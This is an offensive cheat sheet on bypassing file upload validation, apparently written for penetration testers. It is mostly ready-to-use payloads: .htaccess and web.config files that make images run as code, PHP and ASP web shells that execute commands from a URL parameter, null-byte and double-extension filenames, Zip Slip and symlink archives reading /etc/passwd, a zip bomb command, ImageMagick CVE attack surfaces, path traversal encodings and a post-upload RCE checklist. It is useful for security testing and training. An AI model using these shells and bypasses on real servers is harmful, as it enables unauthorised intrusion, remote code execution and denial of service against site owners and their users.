# File Upload Bypass — Decision Matrix & Advanced Techniques

## Server-Side Validation Bypass Matrix

| Validation Type | Bypass Method | Notes |
|----------------|---------------|-------|
| Extension blocklist | Use `.php5`, `.phtml`, `.phar` | Or `.PHP` case |
| Extension allowlist | Use `.htaccess` + `.jpg` combo | If dir config allowed |
| MIME type check | Change `Content-Type` in Burp | Client-controlled |
| Magic bytes check | Prepend `GIF89a` / JPEG bytes | File still executes |
| Content scanner | Use polyglot / obfuscated shell | Or comment in EXIF |
| Filename sanitize | Try URL encoding `..%2f`, `%00` | Server-dependent |
| Storage outside webroot | Zip Slip / symlink race | Rare |

## .htaccess Upload — Most Powerful Apache Bypass

If you can upload to a directory and upload `.htaccess`:

```apache
# Make all images execute as PHP
AddType application/x-httpd-php .jpg .jpeg .png .gif .webp

# OR enable CGI
Options +ExecCGI
AddHandler cgi-script .jpg

# OR use PHP handler by filename
<Files "shell.jpg">
  SetHandler application/x-httpd-php
</Files>
```

**Steps:**
1. Upload `.htaccess` (with content above)
2. Upload `shell.jpg` (containing `<?php system($_GET["cmd"]); ?>`)
3. Access `https://target.com/uploads/shell.jpg?cmd=id`

## web.config Upload — IIS Equivalent

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="aspClassic" path="*.jpg" verb="*"
           modules="IsapiModule"
           scriptProcessor="C:\Windows\System32\inetsrv\asp.dll"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

Then upload `shell.jpg`:
```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request("cmd")).StdOut.ReadAll()) %>
```

## Null Byte Bypass (PHP < 5.3.4)

```
filename="shell.php%00.jpg"
filename="shell.php\x00.jpg"
```

PHP's `move_uploaded_file()` treated null byte as string terminator.
The file would be saved as `shell.php` even though check saw `shell.php.jpg`.

## Double Extension Bypass

```
shell.php.jpg          → Apache may execute based on first extension
shell.jpg.php          → serves as PHP if configured
shell.php.unknown      → unknown ext may fall through to PHP handler
```

Apache configuration can be set to execute based on ANY recognized extension in the filename.

## Partial MIME Bypass

```
# Some validators check only the start of Content-Type
Content-Type: image/jpeg; charset=php
Content-Type: image/jpeg/php
```

## Zip Archive Extraction Attacks

### Zip Slip
```python
# Entry name with path traversal
zipfile.ZipInfo("../../var/www/html/shell.php")
```

### Symlink Attack
```bash
# Create symlink in zip pointing to sensitive file
ln -s /etc/passwd link.txt
zip --symlinks payload.zip link.txt
# When extracted, server follows symlink
```

### Zip Bomb (DoS)
```bash
# Create highly compressed file that decompresses to huge size
dd if=/dev/zero bs=1M count=1000 | gzip > bomb.gz
# Server decompresses → OOM or disk fill
```

## ImageMagick Attack Surfaces

| Input Format | Vulnerability | Notes |
|-------------|--------------|-------|
| MVG | Shell injection in `fill 'url(...)'` | CVE-2016-3714 |
| SVG | SSRF via `<image href="...">` | Still relevant |
| MSL | File write via MSL XML processing | CVE-2016-3718 |
| Ghostscript | RCE via PostScript in PDF/PS | CVE-2018-16509 |

## Filename Path Traversal Encoding

```
# Try all of these for ../
../                         (plain)
..\                         (Windows backslash)
..%2F                       (URL encoded slash)
..%5C                       (URL encoded backslash)
%2e%2e%2f                   (full URL encoded)
%2e%2e/                     (partial)
..%c0%af                    (Unicode overlong encoding)
..%ef%bc%8f                 (Unicode fullwidth slash)
....//                      (bypass simple ../ filter)
..../                       (four dots)
```

## Post-Upload Execution Checklist

After successful upload:
```
1. Check response for upload path/URL
2. If no URL in response, try common paths:
   /uploads/<filename>
   /files/<filename>
   /media/<filename>
   /tmp/<filename>
   /static/<filename>
   /assets/<filename>
3. Try original filename + random prefix/suffix
4. Check if file is hashed (MD5 of filename? of content?)
5. If CDN — SVG still works for XSS even without PHP execution
6. If file included via ?page=uploads/file — LFI + upload = RCE
```
